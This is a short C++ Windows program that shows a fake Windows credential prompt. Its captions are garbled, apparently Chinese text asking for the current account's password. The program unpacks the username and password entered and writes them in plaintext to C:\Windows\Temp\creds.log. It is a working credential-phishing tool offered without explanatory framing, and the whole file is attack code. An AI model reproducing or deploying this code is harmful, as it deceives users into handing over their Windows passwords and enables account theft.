#include <Windows.h>
#include <wincred.h>
#pragma comment(lib,"Credui.lib")

BOOL WriteCred(LPWSTR saveAs,LPWSTR username, LPWSTR password) {
	PWCHAR szBuffer = new WCHAR[CREDUI_MAX_USERNAME_LENGTH + CREDUI_MAX_USERNAME_LENGTH+1];
	HANDLE hFile = CreateFile(
		saveAs,
		GENERIC_ALL,
		FILE_SHARE_READ,
		NULL,
		OPEN_ALWAYS,
		FILE_ATTRIBUTE_NORMAL,
		NULL
	);
	wsprintf(szBuffer, L"[+]Username: %s , Password: %s\n", username, password);
	if (hFile != INVALID_HANDLE_VALUE) {
		WriteFile(hFile, szBuffer, lstrlenW(szBuffer)*sizeof(WCHAR), NULL, NULL);
		return TRUE;
	}
	return FALSE;
}

int __stdcall WinMain(
	HINSTANCE hInstance,
	HINSTANCE hPrevInstance,
	LPSTR     lpCmdLine,
	int       nShowCmd
){
	WCHAR username[CREDUI_MAX_USERNAME_LENGTH] = { 0 };
	WCHAR password[CREDUI_MAX_PASSWORD_LENGTH] = { 0 };
	DWORD uLen = CREDUI_MAX_USERNAME_LENGTH;
	DWORD pLen = CREDUI_MAX_PASSWORD_LENGTH;
	WCHAR baseCaption[] = L"�����뵱ǰ�û��˺����룺";
	WCHAR pszCaptionText[] = L"���Ļ�����������������֤";
	WCHAR saveAs[] = L"C:\\Windows\\Temp\\creds.log";
	LPWSTR boxMessage = NULL;
	ULONG  authPackage = 0;
	LPVOID outCredBuffer = NULL;
	ULONG  outCredSize = 0;
	BOOL   bsave = FALSE;

	CREDUI_INFOW credui = { sizeof(credui) };
	credui.cbSize = sizeof(credui);
	credui.hwndParent = NULL;

	credui.pszMessageText = baseCaption;
	credui.pszCaptionText = (PCWSTR)pszCaptionText;
	
	DWORD dwRet = CredUIPromptForWindowsCredentialsW(&credui, 0, &authPackage, NULL, 0, &outCredBuffer, &outCredSize, &bsave, CRED_TYPE_GENERIC);
	if (dwRet == ERROR_SUCCESS) {
		CredUnPackAuthenticationBufferW(0, outCredBuffer, outCredSize, username, &uLen, NULL, 0, password, &pLen);
		WriteCred(saveAs, username, password);
	}
	return 0;
}